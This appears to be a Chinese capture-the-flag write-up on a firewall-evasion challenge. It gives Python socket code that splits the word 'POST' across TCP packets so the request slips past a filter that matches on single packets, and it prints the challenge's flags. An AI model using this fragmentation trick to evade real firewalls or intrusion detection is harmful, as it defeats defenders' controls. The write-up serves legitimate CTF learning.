## 18. Komm, süsser Flagge

### 尝试与解决

> 关键词：拆分数据包

#### 我的 POST

正常情况下一个 POST 请求是这样的：

```plain
POST / HTTP/1.1
Host: 202.38.93.111
Content-Length: 14

239:[redacted]
```

这样的请求文本可以通过 `nc 202.38.93.111:18080 < request1.txt` 发送给服务器。

而防火墙规则恰恰拦截了包含字符串 `POST` 的请求。HTTP 标准要求的 POST 格式必须包含完整的，ASCII 编码的 `POST`，大小写也不能互换，`main.go` 与 Golang 的 HTTP 库源代码也都表明了这一点。似乎没有办法绕过 `POST`。

然而，仔细思考，防火墙拦截的不是含 `POST` 的请求，而是含 `POST` 的 **TCP 数据包**！HTTP 是一种可以分块传输的协议，一个 TCP 数据包并不一定要包含完整的请求。于是，可以将单词 `POST` 拆分到两个数据包中。这一行为无法通过 `nc` 做到，可以用 Python socket 实现。

```python
import socket
from time import sleep

tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_addr = ("202.38.93.111", 18080)
tcp_socket.connect(server_addr)

data1 = '''PO'''
data2 = '''ST / HTTP/1.1
Host: example.com
Content-Length: 14

239:[redacted]
'''
# 注意 Content-Length 要与 token 实际长度匹配

tcp_socket.send(data1.encode())
sleep(1)
tcp_socket.send(data2.encode())
tcp_socket.send(''.encode())

msg = tcp_socket.recv(2048)
print(msg.decode())

tcp_socket.close()
```

立刻获得 flag。

#### 我的 P

这个防火墙规则似乎不太能看得懂，但是题目叫“我的 P”，为何不试试将 `P` 拆分到第一个数据包，其余拆分到第二个数据包呢？

```python
data1 = '''P'''
data2 = '''OST / HTTP/1.1
Host: example.com
Content-Length: 14

239:[redacted]
'''
# 注意 Content-Length 要与 token 实际长度匹配
```

Yes!

*这应该是个非预期解*

#### 我的 GET

这个服务器直接拒绝连接了，不太能想出来怎么搞。

### Flags

```plain
flag{ea5Y_sPl1tt3r_7ea4b86bcd}
```

Easy splitter. 指拆分数据包。

```plain
flag{r3s3rv3d_bYtes_b2a0c7be14}
```

Reserved bytes. 我不到啊
